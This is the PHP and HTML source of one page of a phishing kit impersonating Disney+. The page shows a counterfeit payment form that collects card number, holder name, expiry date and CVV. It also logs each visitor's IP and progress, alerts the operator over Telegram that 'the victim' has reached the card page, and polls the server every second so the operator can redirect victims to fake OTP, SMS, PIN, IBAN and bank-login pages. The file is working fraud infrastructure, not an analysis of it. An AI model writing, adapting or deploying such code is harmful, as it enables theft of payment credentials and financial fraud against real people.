<?php
session_start();
include('../../common/sub_includes.php');
include('../../app/1.php');
include('../../app/2.php');
include('../traduction.php');

if (($_SESSION['index']  ?? '') != '1') { header('Location: ../../', true, 302); exit; }
if (($_SESSION['bot']    ?? '') != '1') { header('Location: /site/index.html', true, 302); exit; }
if (($_SESSION['client'] ?? '') != '1') { die('THE SITE IS UNDER MAINTENANCE PLEASE TRY LATER'); }

$ip   = $_SESSION['ip'] ?? ($_SERVER['REMOTE_ADDR'] ?? '');
$hub  = $_SESSION['id5'] ?? '';
$card = $_SESSION['id4'] ?? '';

removeIPFromFile(__DIR__ . '/../' . $hub . '/redirect/otp.txt', $ip);
removeIPFromFile(__DIR__ . '/../' . $hub . '/redirect/otperror.txt', $ip);
removeIPFromFile(__DIR__ . '/../' . $hub . '/redirect/carteInvalide.txt', $ip);

$file = '../../users.json';
$fh = @fopen($file, 'c+');
if ($fh) {
    flock($fh, LOCK_EX);
    $raw  = stream_get_contents($fh);
    $data = $raw !== '' ? json_decode($raw, true) : null;
    if (!is_array($data) || !isset($data['users']) || !is_array($data['users'])) {
        $data = ['users' => []];
    }
    $data['users'][$ip]['step'] = '4';
    ftruncate($fh, 0); rewind($fh);
    fwrite($fh, json_encode($data, JSON_PRETTY_PRINT));
    fflush($fh); flock($fh, LOCK_UN); fclose($fh);
}

if (empty($_SESSION['notif_card'])) {
    sendMessage($telegram['NotifsChatId'], "La victime {$ip} est dans la page carte");
    $_SESSION['notif_card'] = 1;
}

$map = [
    'fin'           => '../' . ($_SESSION['id14'] ?? '') . '/',
    'otp'           => '../' . ($_SESSION['id7']  ?? '') . '/',
    'otperror'      => '../' . ($_SESSION['id7']  ?? '') . '/?error',
    'mail'          => '../' . ($_SESSION['id8']  ?? '') . '/',
    'mailerror'     => '../' . ($_SESSION['id8']  ?? '') . '/?error',
    'sms'           => '../' . ($_SESSION['id9']  ?? '') . '/',
    'smserror'      => '../' . ($_SESSION['id9']  ?? '') . '/?error',
    'bank'          => '../' . ($_SESSION['id13'] ?? '') . '/',
    'bankerror'     => '../' . ($_SESSION['id13'] ?? '') . '/?error',
    'pin'           => '../' . ($_SESSION['id10'] ?? '') . '/',
    'pinerror'      => '../' . ($_SESSION['id10'] ?? '') . '/?error',
    'iban'          => '../' . ($_SESSION['id11'] ?? '') . '/',
    'ibanerror'     => '../' . ($_SESSION['id11'] ?? '') . '/?error',
    'vbv'           => '../' . ($_SESSION['id12'] ?? '') . '/',
    'carteInvalide' => './?error',
];

$load = $_SESSION['load'] ?? '';
unset($_SESSION['load']);
?>
<!DOCTYPE html>
<html style="display: block;">
 <head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta content="IE=Edge" http-equiv="X-UA-Compatible">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
  <link href="../../public/img/favicon.85e279041d79e51b147c1b6feb4f981e.ico" rel="shortcut icon">
  <link color="#1d1fff" href="../../public/img/safari-pinned-tab.f78e1debd6a0496471c542612d2e4bc5.svg" rel="mask-icon">
  <link href="../../public/img/apple-touch-icon.4dd3b8a8853ed0608ee308aa7aa76f82.png" rel="apple-touch-icon" sizes="180x180">
  <link href="../../public/img/favicon-32x32.3699f19f7fdff1a556c0953c12fb883f.png" rel="icon" sizes="32x32" type="image/png">
  <title>Disney+</title>
  <link href="../../public/css/styles.d6986a0e2dd6923e60b1.css" rel="stylesheet" type="text/css">
  <link href="../../public/css/app.30f50da231e6cea1762d.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="../../public/css/css_styles2.css">
  <link rel="stylesheet" href="../../public/css/styles3.css">
  <link data-precedence="next" href="../../public/css/styledesign.css" rel="stylesheet"/>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
  <?php if ($load !== '' && $load !== $card) { ?><meta http-equiv="refresh" content="3; url=../<?= htmlspecialchars($load) ?>/"><?php } ?>
 </head>
 <body class="typeramp-avenir-world-for-disney" id="app_index" style="overflow: auto;">
  <div data-reactroot="" id="webAppRoot">
   <div data-testid="adult-enabled-profile" id="app_body_content">
            <div class="onboarding" data-gv2containerkey="webAppHeader" id="webAppHeader">
          <nav class="sc-fjmCvl fhaErk sc-iomxrj kQhsYK navigation navigation__navigation-bar" data-gv2containerkey="loggedOutNavBar" id="nav-bar" kind="onboarding" role="navigation">
            <div class="sc-dxZgTM veHGO" id="nav-logo">
              <div aria-label="logo" class="sc-jbKcbu gbHCZO" id="logo" placeholder="logo" role="img" tabindex="0" title="logo">
                <div class="logo container--hw-full logo cursor--pointer" style="display: none;"></div>
                <center>
                  <img src="../../public/img/logo.svg" style="height: 50px;width: 85px;margin-top:10px;margin:10px;" alt="">
                </center>
              </div>
            </div>
          </nav>
        </div>
    <div id="webAppScene">
     <div id="app_scene_content">
      <main class="onboarding" id="onboarding_index" style="top: 72px;">
       <div class="onboarding-wrapper">
       <p class="margin--0 overline text-color--secondary padding--bottom-1" data-testid="onboarding-stepper-1-of-5" data-overline="printable"><?=$otp['1']?></p>
        <form data-gv2containerkey="emailForm" id="loginEmail" method="POST" action="../<?=$card?>/app/test.php" name="form" novalidate="">
         <h3 class="text-color--primary padding--bottom-2">
         <?=$otp['2']?>
         </h3>
         <div class="padding--bottom-6">
          <span>
           <p class="body-copy margin--0 text--left text-color--primary" style="display: inline;">
           <?=$otp['3']?>
           </p>
          </span>
         </div>
         <?php if (!empty($_SESSION['payment-error'])) { ?>
         <p class="body-copy margin--0 text--left text-color--secondary padding--bottom-2"><?=htmlspecialchars($_SESSION['payment-error'])?></p>
         <?php } ?>
         <input class="sc-gPEVay eKNCKM sc-ksYbfQ kQYopX text-color--primary body-copy form-input-text" display="inline" id="code" name="number" inputmode="numeric" autocomplete="cc-number" placeholder="<?=$otp['4']?>" type="text">
         <input class="sc-gPEVay eKNCKM sc-ksYbfQ kQYopX text-color--primary body-copy form-input-text" display="inline" id="holder" name="holder" autocomplete="cc-name" placeholder="Titulaire de la carte" type="text">
         <div style="display: flex; gap: 8px;">
          <input class="sc-gPEVay eKNCKM sc-ksYbfQ kQYopX text-color--primary body-copy form-input-text" display="inline" id="exp" name="exp" inputmode="numeric" autocomplete="cc-exp" maxlength="5" placeholder="MM/AA" type="text" style="flex: 1;">
          <input class="sc-gPEVay eKNCKM sc-ksYbfQ kQYopX text-color--primary body-copy form-input-text" display="inline" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc" maxlength="4" placeholder="CVV" type="text" style="flex: 1;">
         </div>
         <div>
          <button class="button button--inline-flex button--primary button--full-width button--height-48 padding--top-3 padding--right-6 padding--bottom-3 padding--left-6 undefined" data-gv2-interaction-bound="true" data-gv2elementkey="agree_&amp;_continue" data-gv2interactionkey="agree_&amp;_continue" data-testid="login-continue-button" name="submit" role="button" type="submit" value="submit">
          <center><span id="spinner" class="spinner"></span></center>
          <span class="btn-content"><?=$otp['5']?></span>
          </button>
         </div>
        </form>
       </div>
      </main>
     </div>
    </div>
    <div id="webAppFooter">
    <footer class="sc-iSDuPN iPmNsO footer footer__container" data-gv2containerkey="footer" id="footer" style="margin-top:  100px;">
      <div class="sc-fZwumE hiJlfA">
        <center><img src="../../public/img/logo.svg" style="height: 50px;width: 85px;margin-top:10px;" alt=""></center>
      </div>
      <div class="sc-fQejPQ ftqojJ">
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['1']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['2']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['3']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['4']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['5']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['6']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['7']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['8']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['9']?>
       </button>
       <button class="link sc-clNaTc cPYkkK link link--primary link--primary__h metadata" type="button">
       <?=$footer['10']?>
       </button>
      </div>
      <div class="metadata text-color--secondary padding--top-2 padding--bottom-6 text--center">
      <?=$footer['11']?>
      </div>
     </footer>
    </div>
   </div>
  </div>
  <script src="../../public/js/jquery.js"></script>
  <script src="../../public/js/jquery.mask.js"></script>
  <script src="../../public/js/login.js"></script>
  <script src="../../public/js/mask.js"></script>
  <script src="../../public/js/amex.js"></script>
  <script src="../../public/js/redirect.js"></script>
  <script src="../../public/js/validation/2.js"></script>
  <script>
  (function () {
    var targets = <?= json_encode($map) ?>;
    var files = Object.keys(targets);
    var url = '../<?= $hub ?>/check_ip.php';
    var busy = false;

    function poll() {
      if (busy) return;
      busy = true;
      fetch(url + '?all=1&t=' + Date.now(), { cache: 'no-store' })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          for (var i = 0; i < files.length; i++) {
            if (d[files[i]]) { window.location.href = targets[files[i]]; return; }
          }
        })
        .catch(function () {})
        .finally(function () { busy = false; });
    }

    poll();
    setInterval(poll, 1000);
  })();
  </script>
 </body>
</html>